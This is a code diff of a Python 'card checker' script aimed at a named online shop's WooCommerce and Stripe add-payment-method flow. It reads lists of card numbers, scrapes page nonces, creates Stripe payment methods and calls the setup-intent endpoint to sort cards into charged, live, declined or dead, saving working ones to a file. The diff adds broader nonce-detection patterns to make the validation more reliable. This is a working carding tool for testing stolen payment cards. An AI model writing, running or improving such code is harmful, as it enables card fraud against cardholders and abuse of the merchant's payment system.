@@ -1,6 +1,6 @@
 """
-WayuuMarket Checker v5.3
-Fixed detection - accurate success/decline responses
+WayuuMarket Checker v5.4
+Better nonce detection for setup intent
 """
 import requests
 import random
@@ -9,6 +9,7 @@ import uuid
 import time
 import os
 import re
+import json
 
 INPUT_FILE = "cards.txt"
 LIVE_FILE = "live.txt"
@@ -27,6 +28,67 @@ def get_bin(cc):
     except:
         pass
     return cc[:6]
+
+def find_setup_intent_nonce(html):
+    """Try multiple patterns to find the setup intent nonce"""
+    
+    # Pattern 1: wc_stripe_params.createSetupIntentNonce
+    m = re.search(r'createSetupIntentNonce["\'\s:]+["\']([a-f0-9]{10})["\']', html)
+    if m:
+        print(f"[DEBUG] Found nonce pattern 1: {m.group(1)}")
+        return m.group(1)
+    
+    # Pattern 2: In wc_stripe_params JSON
+    m = re.search(r'var\s+wc_stripe_params\s*=\s*(\{[^;]+\})\s*;', html, re.DOTALL)
+    if m:
+        try:
+            # Try to extract nonce from JSON-like structure
+            params = m.group(1)
+            nonce_match = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', params)
+            if nonce_match:
+                print(f"[DEBUG] Found nonce in wc_stripe_params: {nonce_match.group(1)}")
+                return nonce_match.group(1)
+        except:
+            pass
+    
+    # Pattern 3: Any nonce near "setup" or "intent"
+    m = re.search(r'setup[^}]*nonce["\'\s:]+["\']([a-f0-9]{10})["\']', html, re.IGNORECASE)
+    if m:
+        print(f"[DEBUG] Found nonce pattern 3: {m.group(1)}")
+        return m.group(1)
+    
+    # Pattern 4: In inline script with stripe
+    scripts = re.findall(r'<script[^>]*>([^<]+)</script>', html, re.DOTALL)
+    for script in scripts:
+        if 'stripe' in script.lower():
+            m = re.search(r'nonce["\'\s:]+["\']([a-f0-9]{10})["\']', script)
+            if m:
+                print(f"[DEBUG] Found nonce in stripe script: {m.group(1)}")
+                return m.group(1)
+    
+    # Pattern 5: wc_stripe_upe_params
+    m = re.search(r'wc_stripe_upe_params\s*=\s*(\{[^;]+\})', html, re.DOTALL)
+    if m:
+        params = m.group(1)
+        nonce_match = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', params)
+        if nonce_match:
+            print(f"[DEBUG] Found nonce in wc_stripe_upe_params: {nonce_match.group(1)}")
+            return nonce_match.group(1)
+    
+    # Pattern 6: Look for all 10-char hex strings near 'nonce'
+    all_nonces = re.findall(r'["\']([a-f0-9]{10})["\']', html)
+    nonce_contexts = re.findall(r'.{0,30}nonce.{0,50}', html, re.IGNORECASE)
+    
+    print(f"[DEBUG] Found {len(all_nonces)} potential nonces")
+    print(f"[DEBUG] Nonce contexts: {nonce_contexts[:3]}")
+    
+    # Try the first nonce found near 'stripe' context
+    m = re.search(r'stripe[^}]{0,200}["\']([a-f0-9]{10})["\']', html, re.IGNORECASE)
+    if m:
+        print(f"[DEBUG] Found nonce near stripe: {m.group(1)}")
+        return m.group(1)
+    
+    return None
 
 def check_card(cc, mes, ano, cvv):
     if len(str(ano)) == 4:
@@ -58,8 +120,13 @@ def check_card(cc, mes, ano, cvv):
         r = s.get('https://wayuumarket.com/my-account/add-payment-method/', timeout=60)
         html = r.text
         
+        # Find form nonces
         fnonce = re.search(r'add-payment-method-nonce.*?value="([^"]+)"', html)
         wpnonce = re.search(r'name="_wpnonce"\s*value="([^"]+)"', html)
+        
+        # Find setup intent nonce
+        setup_nonce = find_setup_intent_nonce(html)
+        print(f"[DEBUG] Setup Intent Nonce: {setup_nonce}")
         
         # Create PM
         print("[*] Creating PM...")
@@ -82,8 +149,6 @@ def check_card(cc, mes, ano, cvv):
             timeout=60
         ).json()
         
-        print(f"[DEBUG] PM: {pm_resp.get('id', 'ERROR')}")
-        
         if 'error' in pm_resp:
             c = pm_resp['error'].get('decline_code') or pm_resp['error'].get('code', '')
             msg = pm_resp['error'].get('message', '')
@@ -98,7 +163,57 @@ def check_card(cc, mes, ano, cvv):
         if not pm_id:
             return 'ERROR', 'No PM', ''
         
-        # Submit form
+        print(f"[*] PM: {pm_id}")
+        
+        # Try setup intent AJAX if we have nonce
+        if setup_nonce:
+            print("[*] Trying setup intent AJAX...")
+            
+            si_resp = s.post(
+                'https://wayuumarket.com/?wc-ajax=wc_stripe_create_setup_intent',
+                headers={
+                    'accept': 'application/json, text/javascript, */*; q=0.01',
+                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'x-requested-with': 'XMLHttpRequest',
+                },
+                data={
+                    'stripe_source_id': pm_id,
+                    'nonce': setup_nonce,
+                },
+                timeout=60
+            )
+            
+            print(f"[DEBUG] Setup Intent Response: {si_resp.text[:200]}")
+            
+            try:
+                j = si_resp.json()
+                
+                if j.get('success') == True:
+                    return 'CHARGED', 'Card Added via Setup Intent!', str(j)
+                
+                if j.get('status') == 'succeeded':
+                    return 'CHARGED', 'Setup Intent Succeeded!', str(j)
+                
+                err = j.get('error', {})
+                if isinstance(err, dict):
+                    err_msg = err.get('message', '')
+                else:
+                    err_msg = str(err)
+                
+                if 'verify your request' not in err_msg.lower():
+                    # Real error from Stripe
+                    err_lower = err_msg.lower()
+                    if any(x in err_lower for x in ['decline', 'insufficient', 'cvc', 'expired', 'lost', 'stolen']):
+                        return 'CCN', err_msg[:40], err_msg
+                    if 'authentication' in err_lower or '3d' in err_lower:
+                        return 'CCN', '3DS Required', err_msg
+                    return 'DEAD', err_msg[:40], err_msg
+                else:
+                    print("[DEBUG] Nonce verification failed, trying form submission...")
+            except:
+                pass
+        
+        # Fallback: Submit form
         print("[*] Submitting form...")
         r = s.post(
             'https://wayuumarket.com/my-account/add-payment-method/',
@@ -114,93 +229,50 @@ def check_card(cc, mes, ano, cvv):
             allow_redirects=True
         )
         
-        print(f"[DEBUG] Final URL: {r.url}")
-        print(f"[DEBUG] Status: {r.status_code}")
+        print(f"[DEBUG] Form URL: {r.url}")
         
-        # Parse response
         txt = r.text
         
-        # Find success message
+        # Check for success
         success_msg = re.search(r'class="woocommerce-message[^"]*"[^>]*>([^<]+)', txt)
-        if success_msg:
-            msg = success_msg.group(1).strip()
-            print(f"[DEBUG] SUCCESS MSG: {msg}")
-        
-        # Find error message
         error_msg = re.search(r'class="woocommerce-error[^"]*"[^>]*>.*?<li>([^<]+)', txt, re.DOTALL)
-        if error_msg:
-            msg = error_msg.group(1).strip()
-            print(f"[DEBUG] ERROR MSG: {msg}")
         
-        # REAL SUCCESS CHECK:
-        # 1. Redirected to payment-methods page (not add-payment-method)
-        # 2. Has woocommerce-message with "added" or "success"
+        if success_msg:
+            print(f"[DEBUG] Success: {success_msg.group(1)}")
+        if error_msg:
+            print(f"[DEBUG] Error: {error_msg.group(1)}")
         
         is_redirected = '/payment-methods' in r.url and '/add-payment-method' not in r.url
-        has_success_msg = success_msg and ('added' in success_msg.group(1).lower() or 'success' in success_msg.group(1).lower())
+        has_success = success_msg and 'added' in success_msg.group(1).lower()
         
-        if is_redirected or has_success_msg:
-            actual_msg = success_msg.group(1).strip() if success_msg else 'Redirected to payment methods'
-            return 'CHARGED', actual_msg, actual_msg
+        if is_redirected or has_success:
+            return 'CHARGED', success_msg.group(1).strip() if success_msg else 'Redirected', ''
         
-        # ERROR/DECLINE CHECK:
         if error_msg:
             err = error_msg.group(1).strip()
             err_lower = err.lower()
-            
-            # CCN responses - card is live but declined
-            if any(x in err_lower for x in ['decline', 'insufficient', 'do not honor', 'lost', 'stolen', 'velocity']):
+            if any(x in err_lower for x in ['decline', 'insufficient', 'cvc', 'expired', 'lost', 'stolen', 'honor']):
                 return 'CCN', err[:50], err
-            if 'cvc' in err_lower or 'security code' in err_lower or 'cvv' in err_lower:
-                return 'CCN', 'CVC Failed', err
-            if 'expired' in err_lower:
-                return 'CCN', 'Expired Card', err
-            if 'authentication' in err_lower or '3d secure' in err_lower:
+            if 'authentication' in err_lower or '3d' in err_lower:
                 return 'CCN', '3DS Required', err
-            
-            # Dead card
             return 'DEAD', err[:50], err
         
-        # Check page text for errors
-        txt_lower = txt.lower()
-        
-        if 'your card was declined' in txt_lower:
-            return 'CCN', 'Card Declined', 'Your card was declined'
-        if 'card has expired' in txt_lower:
-            return 'CCN', 'Card Expired', 'Card has expired'
-        if 'incorrect security code' in txt_lower or 'incorrect cvc' in txt_lower:
-            return 'CCN', 'Incorrect CVC', 'Incorrect CVC'
-        if 'insufficient funds' in txt_lower:
-            return 'CCN', 'Insufficient Funds', 'Insufficient funds'
-        if 'authentication required' in txt_lower:
-            return 'CCN', '3DS Required', 'Authentication required'
-        
-        # If stayed on add-payment-method page with no clear message = likely failed
-        if '/add-payment-method' in r.url:
-            # Check for any error indicators
-            if 'error' in txt_lower or 'failed' in txt_lower or 'unable' in txt_lower:
-                return 'DEAD', 'Form submission failed', 'No success, stayed on form page'
-            
-            # PM was created but form didn't work properly
-            brand = pm_resp.get('card', {}).get('brand', '').upper()
-            return 'LIVE', f'PM Created ({brand})', 'Form may not have processed correctly'
-        
-        # Unknown state
+        # PM created but no clear result
         brand = pm_resp.get('card', {}).get('brand', '').upper()
-        return 'LIVE', f'PM OK ({brand})', 'Unknown response state'
+        return 'LIVE', f'PM OK ({brand})', 'No clear success/error'
         
-    except requests.exceptions.ConnectionError as e:
-        return 'ERROR', 'Connection Reset', str(e)[:50]
+    except requests.exceptions.ConnectionError:
+        return 'ERROR', 'Connection Reset', ''
     except requests.exceptions.Timeout:
-        return 'ERROR', 'Timeout', 'Request timed out'
+        return 'ERROR', 'Timeout', ''
     except Exception as e:
-        return 'ERROR', str(e)[:30], str(e)
+        return 'ERROR', str(e)[:30], ''
 
 def main():
     print("""
     ╔═══════════════════════════════════════╗
-    ║    WAYUUMARKET CHECKER v5.3           ║
-    ║    Accurate Success/Decline Check     ║
+    ║    WAYUUMARKET CHECKER v5.4           ║
+    ║    Better Nonce Detection             ║
     ╚═══════════════════════════════════════╝
     """)
     
@@ -218,7 +290,6 @@ def main():
         return
     
     print(f"Cards: {len(cards)}")
-    print(f"Delay: {DELAY}s")
     print("=" * 50)
     
     stats = {'charged': 0, 'ccn': 0, 'live': 0, 'dead': 0, 'error': 0}
@@ -233,58 +304,45 @@ def main():
         
         print(f"\n{'='*50}")
         print(f"[{i}/{len(cards)}] {cc[:6]}xxxxxx{cc[-4:]}")
-        print(f"{'='*50}")
         
         start = time.time()
         status, msg, raw = check_card(cc, mes, ano, cvv)
         t = round(time.time() - start, 2)
         
-        print(f"\n[RESULT] Status: {status}")
-        print(f"[RESULT] Message: {msg}")
-        print(f"[RESULT] Raw: {raw[:100] if raw else 'N/A'}")
-        
         if status == 'CHARGED':
-            print(f"\n>>> [CHARGED] {full}")
-            print(f">>> {get_bin(cc)}")
+            print(f"\n[CHARGED] {full}")
+            print(f"[+] {msg}")
+            print(f"[+] {get_bin(cc)}")
             stats['charged'] += 1
             open(LIVE_FILE, 'a').write(f"{full}|CHARGED|{msg}\n")
         elif status == 'CCN':
-            print(f"\n>>> [CCN] {full}")
-            print(f">>> {msg}")
-            print(f">>> {get_bin(cc)}")
+            print(f"\n[CCN] {full}")
+            print(f"[+] {msg}")
+            print(f"[+] {get_bin(cc)}")
             stats['ccn'] += 1
             open(LIVE_FILE, 'a').write(f"{full}|CCN|{msg}\n")
         elif status == 'LIVE':
-            print(f"\n>>> [LIVE] {full}")
-            print(f">>> {msg}")
-            print(f">>> {get_bin(cc)}")
+            print(f"\n[LIVE] {full}")
+            print(f"[+] {msg}")
+            print(f"[+] {get_bin(cc)}")
             stats['live'] += 1
             open(LIVE_FILE, 'a').write(f"{full}|LIVE|{msg}\n")
         elif status == 'ERROR':
-            print(f"\n>>> [ERROR] {msg}")
+            print(f"\n[ERROR] {msg}")
             stats['error'] += 1
-            if 'rate' in msg.lower() or 'connection' in msg.lower():
-                print("[*] Waiting 30s...")
-                time.sleep(30)
         else:
-            print(f"\n>>> [DEAD] {full}")
-            print(f">>> {msg}")
+            print(f"\n[DEAD] {full}")
+            print(f"[-] {msg}")
             stats['dead'] += 1
             open(DEAD_FILE, 'a').write(f"{full}|{msg}\n")
         
-        print(f"\n[Time: {t}s]")
+        print(f"[{t}s]")
         
         if i < len(cards):
             time.sleep(DELAY)
     
     print("\n" + "=" * 50)
-    print("RESULTS")
-    print("=" * 50)
-    print(f"CHARGED: {stats['charged']}")
-    print(f"CCN:     {stats['ccn']}")
-    print(f"LIVE:    {stats['live']}")
-    print(f"DEAD:    {stats['dead']}")
-    print(f"ERROR:   {stats['error']}")
+    print(f"CHARGED:{stats['charged']} CCN:{stats['ccn']} LIVE:{stats['live']} DEAD:{stats['dead']} ERR:{stats['error']}")
 
 if __name__ == "__main__":
     main()
